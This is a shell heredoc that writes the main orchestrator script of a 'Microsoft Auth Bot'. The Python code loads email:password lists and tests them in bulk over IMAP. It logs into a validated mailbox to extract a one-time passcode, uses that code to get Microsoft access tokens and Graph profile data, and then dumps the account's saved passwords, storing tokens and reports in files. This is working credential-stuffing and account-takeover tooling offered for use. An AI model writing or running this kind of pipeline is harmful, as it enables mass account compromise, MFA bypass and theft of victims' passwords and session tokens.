cat > /opt/microsoft_auth_bot/main.py << 'PYEOF'
import json
import os
import sys
import asyncio
import argparse
from config import VALIDATED_FILE, PASSWORD_REPORT_FILE, SESSION_FILE, IMAP_MAP, DEFAULT_IMAP_SERVER
from imap_validator import IMAPValidator
from otp_extractor import OTPExtractor
from microsoft_auth import MicrosoftAuthenticator
from password_monitor import MicrosoftPasswordMonitor

parser = argparse.ArgumentParser(description="Microsoft Auth Bot Orchestrator")
parser.add_argument("--resume", action="store_true", help="Skip completed phases")
parser.add_argument("--verbose", action="store_true", help="Detailed logging")
parser.add_argument("--phase", type=str, default="all", choices=["validate", "otp", "auth", "password", "all"], help="Run specific phase")
parser.add_argument("--config", type=str, default=".env", help="Path to .env file")
args = parser.parse_args()

def run_validation(credentials_file):
    print("[PHASE 1] Validating credentials...")
    validator = IMAPValidator()
    credentials = []
    with open(credentials_file, "r") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line:
                parts = line.split(":", 1)
                credentials.append({"email": parts[0].strip(), "password": parts[1].strip()})
    results = validator.validate_batch(credentials)
    validated = [r for r in results if r["imap_login"]]
    with open(VALIDATED_FILE, "w") as f:
        json.dump({"validated": validated, "count": len(validated)}, f, indent=2)
    print(f"[PHASE 1] Complete. {len(validated)}/{len(credentials)} validated.")
    return validated

def run_otp(validated):
    print("[PHASE 2] Fetching OTP...")
    otp_extractor = OTPExtractor()
    first_cred = validated[0]
    otp_extractor.connect(first_cred["email"], first_cred["password"])
    otp = otp_extractor.fetch_otp(first_cred["email"])
    otp_extractor.disconnect()
    if not otp:
        print("[PHASE 2] No OTP found.")
        return None
    print(f"[PHASE 2] OTP extracted: {otp}")
    return otp

def run_auth(validated, otp):
    print("[PHASE 3] Authenticating with Microsoft...")
    authenticator = MicrosoftAuthenticator()
    first_cred = validated[0]
    tokens = authenticator.authenticate(first_cred["email"], first_cred["password"], otp)
    if tokens:
        user_data = authenticator.get_graph_data(tokens["access_token"])
        with open(SESSION_FILE, "w") as f:
            json.dump({"email": first_cred["email"], "tokens": tokens, "user_profile": user_data}, f, indent=2)
        print("[PHASE 3] Authentication successful.")
        return tokens
    return None

def run_password_check(tokens):
    print("[PHASE 4] Checking saved passwords...")
    monitor = MicrosoftPasswordMonitor(tokens["access_token"])
    report = monitor.full_password_report()
    with open(PASSWORD_REPORT_FILE, "w") as f:
        json.dump(report, f, indent=2)
    print("[PHASE 4] Password check complete.")
    return report

def main():
    print(f"[*] Orchestrator started (phase={args.phase}, resume={args.resume}, verbose={args.verbose})")
    credentials_file = sys.argv[1] if len(sys.argv) > 1 else "credentials.txt"
    if not os.path.exists(credentials_file):
        print(f"[!] Credentials file not found: {credentials_file}")
        return
    if args.phase in ["validate", "all"]:
        validated = run_validation(credentials_file)
        if not validated:
            print("[!] No validated credentials. Stopping.")
            return
    else:
        with open(VALIDATED_FILE, "r") as f:
            validated = json.load(f).get("validated", [])
    if args.phase in ["otp", "all"]:
        otp = run_otp(validated)
        if not otp:
            print("[!] No OTP. Stopping.")
            return
    else:
        otp = None
    if args.phase in ["auth", "all"]:
        tokens = run_auth(validated, otp)
        if not tokens:
            print("[!] Auth failed. Stopping.")
            return
    else:
        tokens = None
    if args.phase in ["password", "all"]:
        if not tokens:
            with open(SESSION_FILE, "r") as f:
                tokens = json.load(f).get("tokens")
        if tokens:
            run_password_check(tokens)
    print("[*] Orchestrator complete.")

if __name__ == "__main__":
    main()
PYEOF
